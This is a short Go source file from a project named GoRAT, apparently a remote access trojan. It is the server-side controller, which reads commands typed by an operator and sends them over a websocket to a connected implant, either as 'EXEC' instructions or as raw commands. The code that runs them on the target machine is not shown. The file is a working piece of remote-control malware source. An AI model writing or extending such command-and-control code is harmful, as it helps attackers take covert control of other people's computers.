// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package server

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/gorilla/websocket"
)

func waitForMode(c *websocket.Conn) {
	reader := bufio.NewReader(os.Stdin)
	text, _ := reader.ReadString('\n')
	stripped := strings.TrimSpace(text)

	if stripped == "e" {
		execMode(c)
	} else if stripped == "c" {
		cmdMode(c)
	}
}

func execMode(c *websocket.Conn) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Execute $ ")
	text, _ := reader.ReadString('\n')
	stripped := strings.TrimSpace(text)

	c.WriteMessage(websocket.TextMessage, []byte("EXEC "+stripped))
	waitForMode(c)
}

func cmdMode(c *websocket.Conn) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Command $ ")
	text, _ := reader.ReadString('\n')
	stripped := strings.TrimSpace(text)

	c.WriteMessage(websocket.TextMessage, []byte(stripped))
	waitForMode(c)
}
